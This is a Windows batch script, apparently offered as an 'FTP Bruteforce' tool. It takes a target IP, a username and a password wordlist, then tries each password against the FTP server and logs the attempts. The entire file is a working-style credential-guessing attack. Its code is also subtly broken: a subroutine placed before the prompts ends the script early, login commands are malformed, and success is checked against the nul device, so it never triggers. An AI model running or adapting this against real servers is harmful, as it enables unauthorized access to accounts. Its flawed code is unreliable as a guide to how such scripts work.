@echo off
title FTP Bruteforce by Noah Khetani
color B
echo.
setlocal enabledelayedexpansion

:: Function to get the current timestamp
:timestamp
for /f "tokens=1-5 delims=:. " %%a in ("%time%") do (
    set hour=%%a
    set minute=%%b
    set second=%%c
)
set timestamp=%hour%-%minute%-%second%
goto :eof

:: User inputs
set /p ip="Enter FTP Server IP: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "
set /p log="Enter Log File Name (leave blank for default: ftp_bruteforce_log.txt): "

:: Initialize attempt counter and log file
set count=0
if "%log%"=="" set log=ftp_bruteforce_log.txt
echo Starting FTP Bruteforce >> %log%
echo. >> %log%

:: Loop through the password list
for /f "tokens=*" %%a in (%wordlist%) do (
    set "pass=%%a"
    call :timestamp
    call :attempt
)
echo Password not Found :(
echo. >> %log%
echo Password not Found :( >> %log%
pause
exit

:success
echo.
echo Password Found! !pass!
echo [SUCCESS] [!pass!] [!timestamp!] >> %log%
pause
exit

:attempt
:: Create an FTP script to attempt login
(
echo open %ip%
echo %user%
echo !pass!
echo bye
) > ftpscript.txt

:: Attempt to connect using the current password
ftp -n -s:ftpscript.txt > nul
echo [ATTEMPT !count!] [!pass!] [!timestamp!]
echo [ATTEMPT !count!] [!pass!] [!timestamp!] >> %log%

:: Check if the connection was successful
find "230" nul >nul
if %errorlevel% equ 0 goto success

:: Increment the attempt counter
set /a count+=1
goto :eof
